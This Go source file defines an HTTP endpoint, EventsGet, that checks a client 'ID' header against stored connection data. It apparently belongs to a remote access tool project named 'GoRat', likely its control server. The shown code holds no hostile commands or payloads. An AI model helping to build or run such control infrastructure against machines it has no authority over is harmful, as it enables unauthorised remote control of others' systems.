package endpoints

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/NotKatsu/GoRat/modules/database"

	"github.com/pterm/pterm"
)

func EventsGet(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		customID := r.Header.Get("ID")

		if customID == "" || database.GetConnectionData(customID) == "" {
			invalidIDError := Error{
				ErrorCode:    http.StatusUnauthorized,
				ErrorMessage: "Data could not be retrived as ID is not valid.",
			}
			w.WriteHeader(http.StatusUnauthorized)

			invalidIDErrorJson, err := json.Marshal(invalidIDError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			} else {
				_, err := w.Write(invalidIDErrorJson)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				}
			}
		} else {
			fmt.Fprintf(w, "Everything looks all good and you are authorized.")
		}

	} else {
		wrongMethodError := Error{
			ErrorCode:    http.StatusMethodNotAllowed,
			ErrorMessage: "GET is the only accepted Method for this endpoint.",
		}
		w.WriteHeader(http.StatusMethodNotAllowed)

		wrongMethodErrorJson, err := json.Marshal(wrongMethodError)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		} else {
			_, err := w.Write(wrongMethodErrorJson)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}
	}
}
